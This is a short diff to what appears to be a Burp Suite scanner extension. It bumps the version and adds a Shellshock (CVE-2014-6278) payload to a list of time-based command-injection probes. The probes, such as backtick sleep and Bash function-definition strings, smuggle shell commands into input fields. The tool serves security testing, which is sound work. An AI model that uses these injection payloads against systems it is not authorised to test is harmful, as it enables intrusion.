@@ -25,7 +25,7 @@ from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertio
 import jarray
 
 
-version = "1.0.7"
+version = "1.0.8"
 callbacks = None
 
 
@@ -68,8 +68,8 @@ class CodeExec(IScannerCheck):
             'ruby': ["'+sleep($time)+'", '"+sleep($time)+"'],
 
             # Exploits shell command injection into '$input' on linux and "$input" on windows:
-            # and CVE-2014-6271
-            'any': ['"&timeout $time&\'`sleep $time`\'', '() { :;}; /bin/sleep $time'],
+            # and CVE-2014-6271, CVE-2014-6278
+            'any': ['"&timeout $time&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],
 
             # Expression language injection
             'java': [
